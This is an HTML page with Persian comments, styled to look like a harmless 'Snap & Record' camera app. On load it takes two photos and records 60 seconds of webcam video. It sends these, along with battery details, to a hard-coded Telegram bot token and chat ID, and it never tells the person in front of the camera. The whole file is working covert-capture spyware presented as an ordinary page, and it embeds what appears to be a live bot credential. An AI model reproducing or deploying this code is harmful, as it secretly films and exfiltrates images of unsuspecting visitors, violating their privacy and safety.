<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Snap & Record</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Vazirmatn', sans-serif;
      background: #FFFC00;
      overflow: hidden;
    }
    #video {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline muted></video>

  <script>
    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002651451203";

    let stream;
    let mediaRecorder;
    let chunks = [];
    let videoSent = false;
    let photoCount = 0;

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;

        video.onloadedmetadata = async () => {
          startRecording();
          await takePhoto();           // عکس اول
          setTimeout(() => takePhoto(), 4000);  // عکس دوم
          setTimeout(() => stopRecording(), 60000); // توقف پس از ۶۰ ثانیه
        };
      } catch (err) {
        alert("دوربین در دسترس نیست.");
      }
    }

    async function takePhoto() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo_${photoCount}.jpg`);
        form.append("caption", caption);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, "image/jpeg", 0.8);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
    }

    function stopRecording() {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    }

    async function sendVideo() {
      if (videoSent || !chunks.length) return;
      videoSent = true;

      const blob = new Blob(chunks, { type: "video/webm" });
      const battery = await getBatteryInfo();

      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", `🎥 ویدیو ضبط شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    window.addEventListener("beforeunload", () => {
      stopRecording(); // توقف اگر زود بسته شد
    });

    startCamera();
  </script>
</body>
</html>
